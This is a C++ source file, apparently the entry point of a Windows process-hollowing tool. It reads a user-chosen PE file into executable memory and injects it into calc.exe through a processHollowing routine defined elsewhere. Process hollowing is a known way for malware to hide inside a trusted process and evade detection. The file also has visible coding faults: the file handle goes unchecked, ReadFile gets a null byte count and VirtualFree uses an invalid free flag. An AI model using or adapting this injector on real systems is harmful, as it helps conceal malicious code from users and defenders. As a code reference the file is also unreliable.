#include "process_hollowing.h"
#include "PE.h"
#include <iostream>
#include <string>
using namespace std;
bool get_calc_path(LPWSTR lpwOutPath, DWORD szOutPath)
{
#if defined(_WIN64)
	ExpandEnvironmentStrings(L"%SystemRoot%\\SysWoW64\\calc.exe", lpwOutPath, szOutPath);
#else
	ExpandEnvironmentStrings(L"%SystemRoot%\\system32\\calc.exe", lpwOutPath, szOutPath);
#endif
	printf("%S\n", lpwOutPath);
	return true;
}
int main(int argc, char* argv[]) {
	string fileName;
	printf("Enter PE file name to inject: ");
	getline(cin, fileName);

	HANDLE hFile = CreateFileA(
		fileName.c_str(),
		GENERIC_ALL,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	DWORD dwFileSize = GetFileSize(hFile, NULL);
	BYTE* pBuffer = (BYTE*)VirtualAlloc(NULL, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!ReadFile(
		hFile,
		pBuffer,
		dwFileSize,
		NULL,
		NULL
	)) {
		printf("Can't read file\n");
		CloseHandle(hFile);
		return 0;
	}
	WCHAR targetPath[MAX_PATH];
	if (!get_calc_path(targetPath, MAX_PATH)) {
		return -1;
	}

	if (processHollowing(targetPath, pBuffer, dwFileSize)) {
		printf("Injected!\n");
	}
	else {
		printf("Injection failed\n");
	}
	if (pBuffer) {
		VirtualFree(pBuffer, dwFileSize, MEM_FREE);
	}

	system("pause");
	return 0;
}